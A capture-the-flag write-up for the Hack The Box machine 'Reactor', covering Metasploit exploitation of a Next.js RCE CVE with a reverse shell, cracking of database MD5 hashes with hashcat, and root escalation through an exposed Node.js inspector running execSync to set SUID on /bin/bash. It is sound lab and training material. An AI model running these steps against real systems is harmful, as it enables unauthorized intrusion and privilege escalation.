---
machine: Reactor
platform: Hack The Box
category: Linux
difficulty: Easy
tags: [nextjs, cve-2025-55182, react2shell, hash-cracking, nodejs-inspector-rce]
date: 2026-05-27
status: retired
summary: A Linux box running a Next.js web app — testing identification and exploitation of a real-world unauthenticated Next.js remote-code-execution CVE for a foothold, offline hash cracking of database-stored credentials, and abuse of an exposed root-owned Node.js debug inspector for the path to root.
---

## Enumeration

hostscan:

```bash
┌──(kali㉿kali)-[~/htb/reactor]
└─$ nmap -p- -T4 10.129.245.214 -oN hostscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 13:23 -0400
Nmap scan report for 10.129.245.214
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 29.73 seconds

┌──(kali㉿kali)-[~/htb/reactor]
└─$ nmap -p 22,3000  -T4 -sCV 10.129.245.214 -oN fingerprintscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 13:24 -0400
Nmap scan report for 10.129.245.214
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 27 May 2026 17:25:07 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 27 May 2026 17:25:07 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/27%Time=6A1728F1%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Wed,\x2027\x20May\x202026\x2017:25:07\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Wed,
SF:\x2027\x20May\x202026\x2017:25:07\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Wed,\x2027\x20May\x202026\x2017:25:07\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
```

When we navigate to our webpage at `http://<ip>:3000` we see some names for a userlist:
- Dr. Elena Rodriguez
- Marcus Kim
- James Thompson

Running feroxbuster we don't see much else.

## Foothold

After alot of poking around there doesn't seem to be anything exploitable. This suggests maybe a RCE CVE. Given that the boxes name is Reactor, and knowing that the box is running javascript, I try a react2shell module in metasploit against it and it says vulnerable!

I use the msf exploit `multi/http/react2shell_unauth_rce_cve_2025_55182` and disable the DisablePayloadHandler and catch the reverse shell with my Penelope listener for a PTY shell:

```bash
──(kali㉿kali)-[~/htb/reactor/penelope]
└─$ python3 penelope.py 4444                
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 10.0.2.15 • 172.18.0.1 • 172.17.0.1 • 10.10.14.20
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => reactor 10.129.245.214 Linux-x86_64 👤 node(999) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/reactor~10.129.245.214-Linux-x86_64/2026_05_27-14_09_49-277.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
node@reactor:/opt/reactor-app$ whoami
node
```

## Privilege Escalation

After going through my privesc checklist I don't find too much. I decide to poke around the /opt/reactor-app directory a bit and find `reactor.db`  We can find hashes for admin and engineer:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
sensor_logs  users      
sqlite> select * from users
Program interrupted.
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
sqlite> 
```

We can add these to a hash file and crack with plain hash mode:

```bash
echo "a203b22191d744a4e70ada5c101b17b8" > hashes_only.txt
echo "39d97110eafe2a9a68639812cd271e8e" >> hashes_only.txt

hashcat -m 0 hashes_only.txt /usr/share/wordlists/rockyou.txt
```

We see `39d97110eafe2a9a68639812cd271e8e:reactor1` that gives us credentials for engineer
`engineer:reactor1`

We can claim the user flag from his default directory after ssh'ing in

While going through my normal privesc hunting checklist, I eventually checked internal running services. I saw something interesting running `ss -tlnp`

```text
State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process                   
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*                                                
LISTEN                   0                        4096                                             0.0.0.0:22                                             0.0.0.0:*                                                
LISTEN                   0                        4096                                          127.0.0.54:53                                             0.0.0.0:*                                                
LISTEN                   0                        511                                            127.0.0.1:9229                                           0.0.0.0:*                                                
LISTEN                   0                        511                                                    *:3000                                                 *:*                                                
LISTEN                   0                        4096                                                [::]:22                                                [::]:*                                   
```

We see a port running on localhost on port 9299

We can check this port number for more information with `ps auxww | grep 9229`

```bash
root        1407  0.0  1.2 1067332 48528 ?       Ssl  17:19   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
engineer    2252  0.0  0.0   6544  2280 pts/3    S+   19:51   0:00 grep 9229
```

We see node (from node.js) running a process with --inspect as root, this suggests a node.js debugger. We now port forward 127.0.0.1:9229 to our kali machine so we can investigate it and attempt exploitation.

`ssh -L 9229:127.0.0.1:9229 engineer@<ip>`

The --inspect flag for a Node.js instance opens a Chrome DevTools Protocol WebSocket that lets anyone who can reach it execute arbitrary JS in the Node.js process. It is designed for debugging but becomes a backdoor when exposed and running as root.

You can reach the WebSocket URL and submit commands via `/json` in the following format:

```json
{
  "method": "Runtime.evaluate",
  "params": {
    "expression": "1 + 1" # or other arbitrary code
  }
}
```

After port forwarding we can open up a chrome instance and navigate to `chrome://inspect`

From here we can click `configure` and add our debugger: `127.0.0.1:9229` and click `inspect`

This gives us a JS REPL running inside the root Node.js process, we can execute system commands using `child_process` and `execSync('<command>')`

```javascript
process.mainModule.require('child_process').execSync('id').toString()

'uid=0(root) gid=0(root) groups=0(root)\n'
```

Confirms that we are executing system commands as root

Now we can assign `/bin/sh` as an SUID bit so we can execute a root shell from our user engineer:
`process.mainModule.require('child_process').execSync('chmod +s /bin/bash')`

After that command is run we just start a new bash shell with flag -p to bypass the bash safety which attempts to prevent privesc given different real and effective UID values and assign the lower privilege

```bash
engineer@reactor:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# root
bash: root: command not found
bash-5.2# 

```

From here we can go retrieve the root flag and the box is solved!
